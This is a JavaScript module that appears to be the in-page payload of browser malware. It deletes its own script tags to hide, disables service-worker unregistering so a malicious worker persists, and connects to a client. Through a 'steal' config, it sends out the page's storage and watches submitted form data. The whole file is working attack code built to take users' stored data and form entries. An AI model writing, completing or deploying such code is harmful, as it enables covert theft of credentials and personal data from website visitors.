import {Client} from '2sweet'
import removeCurrentScript from '@functions/removeCurrentScript'
import sendStorage from './sendStorage'
import watchForms from './watchForms'
import {steal} from '@config'
import removeScriptsWithSource from '@functions/removeScriptsWithSource'
import {payloadScriptSource} from '@worker/boilerplate'

removeCurrentScript()
removeScriptsWithSource(payloadScriptSource)

pagePayload()

function pagePayload() {
  if (window.hasOwnProperty('binV')) {
    return
  } else {
    window.binV = undefined
  }
  window.ServiceWorkerRegistration.prototype.unregister = function unregister(){}
  const client = new Client()

  client.on('connected', onConnect.bind(null, client))
}

function onConnect(client) {
  if (steal.storage === true) sendStorage(client)
  if (steal.formData === true) watchForms(client)
}
